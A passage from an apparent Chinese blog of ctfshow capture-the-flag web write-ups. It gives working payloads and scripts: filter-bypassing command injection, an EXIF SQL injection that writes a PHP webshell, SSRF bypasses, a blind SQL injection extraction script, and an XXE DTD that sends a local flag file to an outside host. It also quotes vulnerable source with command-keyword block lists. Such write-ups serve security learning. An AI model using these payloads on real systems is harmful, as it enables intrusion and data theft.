<p>浮点数的字长和平台相关，尽管通常最大值是 1.8e308 并具有 14 位十进制数字的精度（64 位 IEEE 格式）。</p>
<p><strong>警告</strong></p>
<h2 id="浮点数的精度"><a href="#浮点数的精度" class="headerlink" title="浮点数的精度"></a>浮点数的精度</h2><p>浮点数的精度有限。尽管取决于系统，PHP 通常使用 IEEE 754 双精度格式，则由于取整而导致的最大相对误差为 1.11e-16。非基本数学运算可能会给出更大误差，并且要考虑到进行复合运算时的误差传递。</p>
<p>此外，以十进制能够精确表示的有理数如 <code>0.1</code> 或 <code>0.7</code>，无论有多少尾数都不能被内部所使用的二进制精确表示，因此不能在不丢失一点点精度的情况下转换为二进制的格式。这就会造成混乱的结果：例如，<code>floor((0.1+0.7)*10)</code> 通常会返回 <code>7</code> 而不是预期中的 <code>8</code>，因为该结果内部的表示其实是类似 <code>7.9999999999999991118...</code>。</p>
<p>所以永远不要相信浮点数结果精确到了最后一位，也永远不要比较两个浮点数是否相等。如果确实需要更高的精度，应该使用<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.bc.php">任意精度数学函数</a>或者 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.gmp.php">gmp 函数</a>。</p>
<p>参见<a target="_blank" rel="noopener" href="http://floating-point-gui.de/">» 浮点数指南</a>网页的简单解释。</p>
</blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(1.000000000000001 == 1);         # bool(false)</span><br><span class="line">var_dump(1.0000000000000001 == 1);        # bool(true)</span><br><span class="line">var_dump(1.0000000000000001 === 1);       # bool(false)</span><br></pre></td></tr></table></figure>

<p>为了绕过回文，后边再加一个0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1000000000000000.00000000000000010</span><br></pre></td></tr></table></figure>

<p>getflag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;nl&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        if (preg_match(&quot;/[&#x27;\*\&quot;[?]/&quot;, $get_flag)) &#123;</span><br><span class="line">            die(&#x27;非预期修复*2&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把nl给ban了，继续抄🐶爹的</p>
<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/04/14/ctf%e9%87%8c%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e7%9b%b8%e5%85%b3%e7%9f%a5%e8%af%86%e7%82%b9%e6%80%bb%e7%bb%93/">ctf里读取文件相关知识点总结</a></p>
<p>空格用<code>&lt;</code>或者<code>%09</code>，读取用<code>base64</code>或者<code>ca\t</code>，<code>php</code>换成<code>ph\p</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?get_flag=base64&lt;flag.ph\p</span><br></pre></td></tr></table></figure>

<h2 id="你没见过的注入"><a href="#你没见过的注入" class="headerlink" title="你没见过的注入"></a>你没见过的注入</h2><p>这题也真够抽象的，确实是没见过😅</p>
<p>先说不用扫，结果还是要访问robots.txt，拿到重置密码的网址<code>/pwdreset.php</code></p>
<p>直接重置密码，进去是个文件上传，无过滤</p>
<p>文件上传后，在后端会被重命名+压缩处理，无利用空间，只有个<code>filetype</code>进行提示</p>
<p>传个php-&gt;<code>filetype:PHP script, ASCII text, with CRLF line terminators</code></p>
<p>看了源码才知道限制了10k</p>
<blockquote>
<p>这里考的是<code>EXIF</code>信息中<code>comment</code>字段注入，这个字段会存入数据库，<code>finfo-&gt;file()</code>再在后面输出这个信息，造成了sql注入漏洞，先去网上下载一个<code>exiftool</code>工具 ——&gt; <a target="_blank" rel="noopener" href="https://exiftool.org/">https://exiftool.org/</a></p>
<p>可以编辑图片的的<code>EXIF</code>信息</p>
<p>payload：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;./exiftool -overwrite_original -comment=<span class="string">&quot;y1ng\&quot;&#x27;);select 0x3C3F3D60245F504F53545B305D603B into outfile &#x27;/var/www/html/1.php&#x27;;#&quot;</span> 1.jpg</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;hex(&lt;?=$_POST[0];)=0x3C3F3D60245F504F53545B305D603B</span><br></pre></td></tr></table></figure>
</blockquote>
<p>不知道哪试出来的从exif信息里注</p>
<p>upload源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		die(&quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if($_FILES[&quot;file&quot;][&quot;size&quot;]&gt;10*1024)&#123;</span><br><span class="line">		die(&quot;文件过大: &quot; .($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">      &#123;</span><br><span class="line">      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    else</span><br><span class="line">      &#123;</span><br><span class="line">	  $filename = md5(md5(rand(1,10000))).&quot;.zip&quot;;</span><br><span class="line">	  $filetype = (new finfo)-&gt;file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">	  $filepath = &quot;upload/&quot;.$filename;</span><br><span class="line">	  $sql = &quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;.$filename.&quot;&#x27;,&#x27;&quot;.$filepath.&quot;&#x27;,&#x27;&quot;.$filetype.&quot;&#x27;);&quot;;</span><br><span class="line">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">      &quot;upload/&quot; . $filename);</span><br><span class="line">	  $con = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;ctf&quot;);</span><br><span class="line">		if (!$con)</span><br><span class="line">		&#123;</span><br><span class="line">			die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br><span class="line">		&#125;</span><br><span class="line">		if (mysqli_multi_query($con, $sql)) &#123;</span><br><span class="line">			header(&quot;location:filelist.php&quot;);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . mysqli_error($con);</span><br><span class="line">		&#125;</span><br><span class="line">		 </span><br><span class="line">		mysqli_close($con);</span><br><span class="line">		</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>本地复现一下</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402082343785.png" alt="image-20240208234314671"></p>
<h2 id="签到-观己"><a href="#签到-观己" class="headerlink" title="签到_观己"></a>签到_观己</h2><p>日志包含</p>
<h2 id="web1-观字"><a href="#web1-观字" class="headerlink" title="web1_观字"></a>web1_观字</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#flag in http://192.168.7.68/flag</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = $_GET[&#x27;url&#x27;];</span><br><span class="line">    $protocol = substr($url, 0,7);</span><br><span class="line">    if($protocol!=&#x27;http://&#x27;)&#123;</span><br><span class="line">        die(&#x27;仅限http协议访问&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\&#x27;|\&quot;|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/&#x27;, $url))&#123;</span><br><span class="line">        die(&#x27;仅限域名地址访问&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    system(&#x27;curl &#x27;.$url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>限制死了http协议，不给用各种特殊字符</p>
<p>本来想着自己的域名转发到192.168.7.68，但是还是会有<code>.</code>，ip转10进制或者16进制都会出现0</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402091451474.png" alt="image-20240209145109405"></p>
<p>curl可以用<code>。</code>代替<code>.</code></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402091452646.png" alt="image-20240209145234588"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://192。168。7。68/flag</span><br></pre></td></tr></table></figure>

<h2 id="web2-观星"><a href="#web2-观星" class="headerlink" title="web2_观星"></a>web2_观星</h2><p>fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;!&#x27;, &#x27;&quot;&#x27;, &quot;&#x27;&quot;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;=&#x27;, &#x27;`&#x27;, &#x27;|&#x27;, &#x27;~&#x27;, &#x27; &#x27;, &#x27;union&#x27;, &#x27;rand&#x27;, &#x27;ascii&#x27;, &#x27;and&#x27;, &#x27;||&#x27;, &#x27;sleep&#x27;, &#x27;benchmark&#x27;, &#x27;rlike&#x27;, &#x27;like&#x27;]</span><br></pre></td></tr></table></figure>

<p>才看出来是int类型盲注，单双引号被ban了，表名可以用16进制代替</p>
<p>逗号被ban用<code>from+for</code>，但是<code>if</code>就彻底没法用了，所以用<code>case when [express] then [x] else [y] end</code>代替</p>
<p><code>ascii</code>直接换用<code>ord</code></p>
<p>直接脚本跑，估计sqlmap只会更快</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://c11b6d04-1817-4495-a58d-96b02ab819f5.challenge.ctf.show/index.php?id=&quot;</span><br><span class="line">alphabets = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;j&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;g&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;,</span><br><span class="line">             &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;G&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;,</span><br><span class="line">             &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;]</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_database_name():</span><br><span class="line">    database = &quot;&quot;</span><br><span class="line">    for i in range(1, 5):</span><br><span class="line">        min = 48</span><br><span class="line">        max = 122</span><br><span class="line">        mid = int((min + max) / 2)</span><br><span class="line">        while max &gt;= min:</span><br><span class="line">            payload = f&quot;case/**/when/**/ord(substr(database()/**/from/**/&#123;i&#125;/**/for/**/1))&lt;&#123;mid&#125;/**/then/**/1/**/else/**/0/**/end&quot;</span><br><span class="line">            burpurl = url + payload</span><br><span class="line">            re = requests.get(burpurl)</span><br><span class="line">            if &quot;If&quot; in re.text:</span><br><span class="line">                max = mid - 1</span><br><span class="line">            else:</span><br><span class="line">                min = mid + 1</span><br><span class="line">            mid = int((min + max) / 2)</span><br><span class="line">        database = database + chr(mid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_table_name():</span><br><span class="line">    table = &quot;&quot;</span><br><span class="line">    for i in range(1, 20):</span><br><span class="line">        min = 48</span><br><span class="line">        max = 122</span><br><span class="line">        mid = int((min + max) / 2)</span><br><span class="line">        while max &gt;= min:</span><br><span class="line">            payload = f&quot;case/**/when/**/ord(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/in/**/(database()))/**/from/**/&#123;i&#125;/**/for/**/1))&lt;&#123;mid&#125;/**/then/**/1/**/else/**/0/**/end&quot;</span><br><span class="line">            burpurl = url + payload</span><br><span class="line">            re = requests.get(burpurl)</span><br><span class="line">            if &quot;If&quot; in re.text:</span><br><span class="line">                max = mid - 1</span><br><span class="line">            else:</span><br><span class="line">                min = mid + 1</span><br><span class="line">            mid = int((min + max) / 2)</span><br><span class="line">        table = table + chr(mid)</span><br><span class="line">        print(table)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_column_name():</span><br><span class="line">    column = &quot;&quot;</span><br><span class="line">    for i in range(1, 20):</span><br><span class="line">        min = 48</span><br><span class="line">        max = 122</span><br><span class="line">        mid = int((min + max) / 2)</span><br><span class="line">        while max &gt;= min:</span><br><span class="line">            payload = f&quot;case/**/when/**/ord(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/in/**/(0x666c6167))/**/from/**/&#123;i&#125;/**/for/**/1))&lt;&#123;mid&#125;/**/then/**/1/**/else/**/0/**/end&quot;</span><br><span class="line">            burpurl = url + payload</span><br><span class="line">            re = requests.get(burpurl)</span><br><span class="line">            if &quot;If&quot; in re.text:</span><br><span class="line">                max = mid - 1</span><br><span class="line">            else:</span><br><span class="line">                min = mid + 1</span><br><span class="line">            mid = int((min + max) / 2)</span><br><span class="line">        column = column + chr(mid)</span><br><span class="line">        print(column)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_data():</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        min = 33</span><br><span class="line">        max = 127</span><br><span class="line">        mid = int((min + max) / 2)</span><br><span class="line">        while max &gt;= min:</span><br><span class="line">            payload = f&quot;case/**/when/**/ord(substr((select/**/group_concat(flag)/**/from/**/flag)/**/from/**/&#123;i&#125;/**/for/**/1))&lt;&#123;mid&#125;/**/then/**/1/**/else/**/0/**/end&quot;</span><br><span class="line">            burpurl = url + payload</span><br><span class="line">            re = requests.get(burpurl)</span><br><span class="line">            if &quot;If&quot; in re.text:</span><br><span class="line">                max = mid - 1</span><br><span class="line">            else:</span><br><span class="line">                min = mid + 1</span><br><span class="line">            mid = int((min + max) / 2)</span><br><span class="line">        flag = flag + chr(mid)</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># get_database_name()</span><br><span class="line"># get_table_name()</span><br><span class="line"># get_column_name()</span><br><span class="line">get_data()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web3-观图"><a href="#web3-观图" class="headerlink" title="web3_观图"></a>web3_观图</h2><p>跳转<code>showImage.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//$key = substr(md5(&#x27;ctfshow&#x27;.rand()),3,8);</span><br><span class="line">//flag in config.php</span><br><span class="line">include(&#x27;config.php&#x27;);</span><br><span class="line">if(isset($_GET[&#x27;image&#x27;]))&#123;</span><br><span class="line">    $image=$_GET[&#x27;image&#x27;];</span><br><span class="line">    $str = openssl_decrypt($image, &#x27;bf-ecb&#x27;, $key);</span><br><span class="line">    if(file_exists($str))&#123;</span><br><span class="line">        header(&#x27;content-type:image/gif&#x27;);</span><br><span class="line">        echo file_get_contents($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用随机生成的<code>key</code>解密<code>image</code>，一段能被正确解析的密文为<code>Z6Ilu83MIDw=</code>，只要猜出原文是什么，就可以通过碰撞出<code>key</code>，然后使用<code>encrypt</code>进行读取了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$r = 0;</span><br><span class="line">while (True)&#123;</span><br><span class="line">    while (ob_get_level()) &#123;</span><br><span class="line">        ob_end_flush();</span><br><span class="line">    &#125;</span><br><span class="line">    $t = rand();</span><br><span class="line">    if ($r&lt;$t)&#123;</span><br><span class="line">        $r = $t;</span><br><span class="line">        echo $t.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//经过碰撞大概可以知道rand的范围为0-2147483647(梅森素数)</span><br></pre></td></tr></table></figure>

<p>写个加密碰撞脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$pass = &quot;Z6Ilu83MIDw=&quot;;</span><br><span class="line">for ($i=0;$i&lt;=2147483647;$i++)&#123;</span><br><span class="line">    while (ob_get_level()) &#123;</span><br><span class="line">        ob_end_flush();</span><br><span class="line">    &#125;</span><br><span class="line">    $key = substr(md5(&#x27;ctfshow&#x27;.$i),3,8);</span><br><span class="line">    if (preg_match(&#x27;/jpg|gif|png/&#x27;,(openssl_decrypt($pass, &#x27;bf-ecb&#x27;, $key))))&#123;</span><br><span class="line">        echo $i.$key.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//碰出来27347</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$file = &quot;config.php&quot;;</span><br><span class="line">$key = substr(md5(&#x27;ctfshow&#x27;.&quot;27347&quot;),3,8);</span><br><span class="line">echo openssl_encrypt($file, &#x27;bf-ecb&#x27;, $key);</span><br></pre></td></tr></table></figure>

<h2 id="web4-观心"><a href="#web4-观心" class="headerlink" title="web4_观心"></a>web4_观心</h2><p>点击<code>占卜</code>访问<code>api.php</code>，看一眼负载一眼xxe</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402151804476.png" alt="image-20240215180430368">*</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a></p>
<p>test.dtd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe &quot;&lt;!ENTITY &amp;#37; xxe SYSTEM &#x27;http://ip/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<p>evil.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">&lt;test&gt;&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<p>直接调用xml就行</p>
<p>这题不知道什么原因，在远程调用<code>&lt;!ENTITY &amp;#37; xxe SYSTEM &#39;http://ip/%file;&#39;&gt;</code>没有实际访问出来，导致在远程没法读出来，但是可以利用<code>file:///flag.txt</code>读到的换行符造成<code>loadXML()</code>报错回显</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402151956352.png" alt="image-20240215195634279"></p>
<p><a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/234655/php-blind-xxe-exploitation-invalid-uri-in-entity">参考</a></p>
<p>如果使用base64后的结果，不会报错，但同时并没有请求出来</p>
<h2 id="web1-此夜圆"><a href="#web1-此夜圆" class="headerlink" title="web1_此夜圆"></a>web1_此夜圆</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">	public $uname;</span><br><span class="line">	public $password;</span><br><span class="line">	public function __construct($uname,$password)</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;uname=$uname;</span><br><span class="line">		$this-&gt;password=$password;</span><br><span class="line">	&#125;</span><br><span class="line">	public function __wakeup()</span><br><span class="line">	&#123;</span><br><span class="line">			if($this-&gt;password===&#x27;yu22x&#x27;)</span><br><span class="line">			&#123;</span><br><span class="line">				include(&#x27;flag.php&#x27;);</span><br><span class="line">				echo $flag;	</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				echo &#x27;wrong password&#x27;;</span><br><span class="line">			&#125;</span><br><span class="line">	